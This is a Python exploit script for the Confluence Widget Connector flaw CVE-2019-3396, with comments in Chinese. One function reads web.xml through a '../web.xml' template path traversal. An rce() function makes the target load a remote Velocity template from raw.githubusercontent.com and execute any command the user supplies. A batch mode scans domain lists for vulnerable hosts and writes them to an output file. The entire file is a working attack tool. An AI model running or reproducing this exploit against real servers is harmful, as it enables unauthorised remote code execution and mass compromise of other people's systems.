# -*- coding: utf -*-
import requests
from bs4 import BeautifulSoup
import sys


def poc_check(domain):
    # poc为读取web/xml
    data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}'
    # header里需要有Refferer，不然返回结果是xsrf check failed
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Referer": domain +
        "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"}
    # 调整url结构，脚本所用的url结构均为ip或者域名，且最后不加斜杠
    if "/rest/tinymce/1/macro/preview" in domain:
        url = domain
    else:
        url = domain + "/rest/tinymce/1/macro/preview"
    print(url)
    try:
        req = requests.post(url, headers=header, data=data)
        # 调用bs4库来提取返回结果中我们想要的值，通过是否存在web-app来判断命令是否执行成功
        soup = BeautifulSoup(req.text, 'html.parser')
        messages = soup.find_all(class_='wiki-content')
        if messages:
            if "<web-app" in str(messages[0]):
                print("[+] %s is vulnerable" % domain)
                # print("\n"+content[0])
                return domain

    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout")
    except requests.exceptions.ConnectionError:
        print("[-] connect error")


# rce函数，接受传进的参数并写入data中，发包到目标，提取命令执行后的结果
def rce(domain, command):
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Referer": domain +
        "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Content-Type": "application/json; charset=utf-8"}
    if "/rest/tinymce/1/macro/preview" in domain:
        url = domain
    else:
        url = domain + "/rest/tinymce/1/macro/preview"

    data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/jinlanzhijiao/exp/master/confluence_rce/r.vm","command":"%s"}}}' % command
    try:
        req = requests.post(url, headers=header, data=data)
        soup = BeautifulSoup(req.text, 'html.parser')
        messages = soup.find_all(class_='wiki-content')
        if messages:
            print("$ %s" % command)
            # 处理一下bs4提取到的返回结果，争取输出干净一点
            message = str(
                messages[0]).replace(
                '<div class="wiki-content">', "")
            message = message.replace("</div>", "")
            print(">>> " + message)

    except requests.exceptions.ConnectTimeout:
        print("[-] conncect timeout")
    except requests.exceptions.ConnectionError:
        print("[-] connect error")


# 循环调用poc_check函数，并保存存在漏洞的url到结果字典，将结果保存在output.txt，并在函数结束前输出结果字典。
def batch(domain_list, output="confluence_output.txt"):
    vuln_list = []
    with open(domain_list, "r") as f:
        domains = f.readlines()
    f_output = open(output, "w")
    for domain in domains:
        vuln_domain = poc_check(domain.strip())
        if vuln_domain:
            f_output.write(vuln_domain + "\n")
            vuln_list.append(vuln_domain)
    f.close()
    f_output.close()

    print("-" * 35)
    i = 1
    for vuln in vuln_list:
        print(str(i) + ". | " + vuln)
        i = i + 1


def usage():
    print(
        '''
    *********************************************************************************
    *                      Conflunce RCE CVE-2019-3396                              *
    * python3 Conflunce_rce_cve-2019-3396.py http://confluence:8090/                *
    * python3 Conflunce_rce_cve-2019-3396.py -f urls.txt -o output.txt              *
    * python3 Conflunce_rce_cve-2019-3396.py http://confluence:8090 --command whoami *
    *********************************************************************************
    '''
    )


if __name__ == '__main__':
    if len(sys.argv) < 2 or sys.argv[1] == "-h":
        usage()
    elif len(sys.argv) == 2:
        poc_check(sys.argv[1])
    elif len(sys.argv) == 3:
        batch(sys.argv[2])
    elif len(sys.argv) == 4:
        rce(sys.argv[1], sys.argv[3])
    elif len(sys.argv) == 5:
        batch(sys.argv[2], sys.argv[4])
    else:
        usage()
